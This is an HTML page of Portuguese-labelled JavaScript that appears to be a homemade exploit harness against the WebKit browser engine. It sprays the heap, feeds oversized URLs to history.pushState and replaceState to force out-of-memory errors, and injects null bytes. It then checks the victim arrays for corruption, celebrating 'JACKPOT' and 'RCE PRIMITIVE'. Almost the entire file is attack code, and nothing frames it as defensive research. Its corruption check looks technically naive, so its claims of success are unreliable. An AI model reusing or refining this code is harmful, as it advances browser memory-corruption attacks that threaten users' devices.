<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WebKit OOM Trigger (Stop on First)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        button { padding: 15px; font-size: 1.2em; background: #111; color: #fff; border: 1px solid #0f0; margin: 10px 0; width: 100%; cursor: pointer; }
        button:hover { background: #222; }
        input { background: #222; color: #fff; border: 1px solid #555; padding: 5px; }
        .win { color: #ff0; font-weight: bold; border: 1px solid #ff0; padding: 5px; background: #440; }
    </style>
</head>
<body>

<h1>REPLICAÇÃO + PARADA IMEDIATA</h1>
<p>Sequência: 6 -> 3 -> 1. O Teste 1 agora para no primeiro erro.</p>

<h3>1. TESTE 6 (Incremental)</h3>
<label>Start:</label> <input type="number" id="t6start" value="1000">
<label>Step:</label> <input type="number" id="t6step" value="5000">
<button onclick="test6_Incremental()">Executar Teste 6</button>

<h3>2. TESTE 3 (Padrões)</h3>
<button onclick="test3_SpecialSequences()">Executar Teste 3</button>

<h3>3. TESTE 1 (Gatilho Único)</h3>
<p style="color:red">Quando aparecer a mensagem: CLIQUE EM CANCELAR.</p>
<button onclick="test1_StressAndInject()" style="border-color:red; color:red">Executar Teste 1</button>

<div id="log"></div>

<script>
const BASE_SAFE = 709522;
let heapObjects = [];
let targetObjects = [];

function log(msg, type='') {
    const el = document.getElementById('log');
    const color = type === 'win' ? 'yellow' : '#0f0';
    el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}

function prepareHeap() {
    log('Preparando heap...');
    heapObjects = [];
    targetObjects = [];
    
    // Spray de Enchimento
    for (let i = 0; i < 500; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0x41414141);
        heapObjects.push({buf, view});
    }
    for (let i = 0; i < heapObjects.length; i += 3) heapObjects[i] = null;

    // Alvos (Vítimas)
    for (let i = 0; i < 50; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0xDEADBEEF);
        targetObjects.push({ id: i, magic: 0xCAFEBABE, view: view });
    }
    log('Heap preparado.');
}

function checkCorruption() {
    let corrupted = 0;
    for (let i = 0; i < Math.min(10, targetObjects.length); i++) {
        try {
            const t = targetObjects[i];
            // Se o tamanho mudou (não é mais 256) ou o conteúdo foi zerado
            if (t.view.length !== 256 || t.view[0] !== 0xDEADBEEF) {
                log(`!!! JACKPOT !!! Alvo ${i} CORROMPIDO! (Len: ${t.view.length}, Val: 0x${t.view[0]?.toString(16)})`, 'win');
                corrupted++;
                document.body.style.backgroundColor = "#200";
                alert("RCE PRIMITIVE: Corrupção confirmada!\nLength: " + t.view.length);
            }
        } catch (e) {
            // Se o ponteiro foi destruído, também é bom sinal
            log(`Alvo ${i} inacessível (Ponteiro destruído): ${e.message}`, 'win');
            corrupted++;
        }
    }
    return corrupted;
}

// === TESTE 6 ===
async function test6_Incremental() {
    log('=== TESTE 6 ===');
    prepareHeap();
    const start = parseInt(document.getElementById('t6start').value);
    const step = parseInt(document.getElementById('t6step').value);
    let currentSize = start;
    
    for (let i = 0; i < 10; i++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let j = 0; j < currentSize; j++) overflow += String.fromCharCode(j % 33);
            const payload = "/" + base + overflow;
            history.pushState({}, `inc_${currentSize}`, payload);
            
            log(`SUCESSO com ${currentSize} bytes`);
            currentSize += step;
            await new Promise(r => setTimeout(r, 1500));
        } catch (e) {
            log(`CRASH em ${currentSize}: ${e.message}`);
            break;
        }
    }
}

// === TESTE 3 ===
async function test3_SpecialSequences() {
    log('=== TESTE 3 ===');
    prepareHeap();
    const sequences = [
        { bytes: [0x00,0x00,0x00,0x00] }, { bytes: [0x0A,0x0A,0x0A,0x0A] },
        { bytes: [0x09,0x09,0x09,0x09] }, { bytes: [0x0D,0x0D,0x0D,0x0D] },
        { bytes: [0x20,0x20,0x20,0x20] }, { bytes: [0x00,0x09,0x0A,0x0D,0x20] },
        { bytes: [0x01,0x02,0x03,0x04,0x05] }, { bytes: [0x07,0x08,0x08,0x07] }
    ];

    for (let seq of sequences) {
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let i = 0; i < 1000; i++) for (let byte of seq.bytes) overflow += String.fromCharCode(byte);
            
            history.pushState({}, "pattern", "/" + base + overflow);
            log(`SUCESSO: Padrão inserido.`);
            await new Promise(r => setTimeout(r, 100));
        } catch (e) {}
    }
}

// === TESTE 1 (GATILHO ÚNICO) ===
async function test1_StressAndInject() {
    log('=== TESTE 1: STRESS LOOP ===');
    prepareHeap(); 
    
    for (let byte = 0x00; byte <= 0xFF; byte++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            const testByte = String.fromCharCode(byte);
            const overflow = testByte.repeat(100); 
            
            history.pushState({}, `test_${byte}`, "/" + base + overflow);
            
            if (byte % 16 === 0) {
                 log(`Testando 0x${byte.toString(16)}...`);
                 await new Promise(r => setTimeout(r, 15)); 
            }
            
        } catch (e) {
            log(`ERRO/OOM DETECTADO (Byte 0x${byte.toString(16)})`);
            log(`Mensagem: ${e.message}`, 'win');
            
            // --- INJEÇÃO IMEDIATA ---
            try {
                log("!!! INJETANDO 29 BYTES (ZEROS) !!!", 'win');
                const base = "A".repeat(BASE_SAFE);
                const attack = "\x00".repeat(29); 
                
                // Sobrescreve o topo da pilha
                history.replaceState({}, "PWN", "/" + base + attack);
                
                log(">>> INJEÇÃO ACEITA NO VÁCUO! <<<", 'win');
                
                // --- PARADA IMEDIATA ---
                log("Verificando corrupção e encerrando...", 'win');
                checkCorruption();
                
                return; // <--- O SEGREDO: Sai do loop e para tudo!
                
            } catch(ex) {
                log("Falha na injeção: " + ex.message);
                return; // Sai mesmo se falhar
            }
        }
    }
    log("Loop finalizado sem OOM. Tente aumentar a carga.");
}
</script>
</body>
</html>
